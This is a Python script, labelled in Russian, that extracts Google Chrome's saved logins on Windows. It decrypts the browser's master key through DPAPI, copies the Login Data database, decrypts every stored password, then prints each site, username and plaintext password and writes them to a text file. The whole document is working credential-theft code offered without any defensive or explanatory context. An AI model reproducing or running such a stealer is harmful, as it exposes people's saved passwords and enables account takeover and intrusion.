import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google",
                                    "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

def save_to_file(origin_url, action_url, username, password, date_created, date_last_used):
    with open("extracted_passwords.txt", "a", encoding="utf-8") as file:
        file.write(f"Исходный URL-адрес: {origin_url}\n")
        file.write(f"URL действия: {action_url}\n")
        file.write(f"Имя пользователя: {username}\n")
        file.write(f"Пароль: {password}\n")
        file.write(f"Дата создания: {str(get_chrome_datetime(date_created)) if date_created != 86400000000 else 'N/A'}\n")
        file.write(f"Последний визит: {str(get_chrome_datetime(date_last_used)) if date_last_used != 86400000000 else 'N/A'}\n")
        file.write("-" * 50 + "\n")

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value,"
                   "password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            print(f"Исходный URL-адрес: {origin_url}")
            print(f"URL действия: {action_url}")
            print(f"Имя пользователя: {username}")
            print(f"Пароль: {password}")
            print(f"Дата создания: {str(get_chrome_datetime(date_created))}")
            print(f"Последний визит: {str(get_chrome_datetime(date_last_used))}")
            print("-" * 50)
            save_to_file(origin_url, action_url, username, password, date_created, date_last_used)

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()
